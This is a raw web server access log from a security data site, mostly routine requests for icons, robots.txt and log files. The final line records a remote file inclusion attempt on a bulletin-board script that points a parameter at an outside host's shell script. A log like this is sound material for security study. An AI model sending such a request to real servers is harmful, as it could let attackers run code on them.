199.106.103.57 - - [15/Jul/2016:10:46:34 -0700] "GET /twitter-icon.png HTTP/1.1" 304 166 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.57 - - [15/Jul/2016:10:46:34 -0700] "GET /GitHub-Mark.png HTTP/1.1" 304 166 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
172.99.78.104 - - [15/Jul/2016:10:47:46 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
172.99.78.104 - - [15/Jul/2016:10:47:46 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Tornado-Async-Client" 
172.99.78.104 - - [15/Jul/2016:10:47:46 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
172.99.78.104 - - [15/Jul/2016:10:47:46 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
89.165.86.209 - - [15/Jul/2016:10:47:51 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:47:56 -0700] "GET /self.logs/ HTTP/1.1" 200 11325 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
89.165.86.209 - - [15/Jul/2016:10:47:59 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" 
111.13.102.5 - - [15/Jul/2016:10:48:06 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
199.106.103.59 - - [15/Jul/2016:10:49:10 -0700] "GET / HTTP/1.1" 200 9904 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.59 - - [15/Jul/2016:10:49:10 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.59 - - [15/Jul/2016:10:49:10 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.59 - - [15/Jul/2016:10:49:11 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17" 
199.106.103.56 - - [15/Jul/2016:10:53:14 -0700] "GET /self.logs/ HTTP/1.1" 200 11325 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:53:19 -0700] "GET /self.logs/access.log.2015-03-15.gz HTTP/1.1" 200 5475 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:54:08 -0700] "GET /bbs/skin/zero_vote/error.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
199.106.103.56 - - [15/Jul/2016:10:54:29 -0700] "GET /bbs/skin/zero_vote/error.php?dir=dir=http://chemfield.co.kr/.mods//sh.txt HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36" 
